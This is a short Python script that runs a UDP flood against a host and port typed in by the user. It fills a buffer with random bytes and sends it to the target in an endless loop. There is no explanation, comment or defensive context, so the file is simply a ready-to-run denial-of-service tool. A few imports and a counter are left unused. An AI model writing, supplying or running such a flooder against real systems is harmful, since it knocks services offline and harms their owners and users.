import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
ip = input("IP Target : ")
port = input("Port       : ")
sent = 0
while True:
     sock.sendto(bytes, (ip, int(port)))
